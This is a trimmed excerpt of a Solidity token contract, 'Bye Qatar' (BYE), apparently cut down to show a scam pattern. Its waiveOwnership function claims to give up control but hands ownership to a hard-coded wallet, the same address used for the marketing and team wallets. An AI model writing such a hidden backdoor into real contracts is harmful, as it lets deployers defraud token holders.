...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xe5264f465f5A7f00dd86E598f4d443d846967fa6);
    }
...
contract ByeQatar is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Bye Qatar";
    string private _symbol = "BYE";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xe5264f465f5A7f00dd86E598f4d443d846967fa6);
    address payable private teamWalletAddress = payable(0xe5264f465f5A7f00dd86E598f4d443d846967fa6);
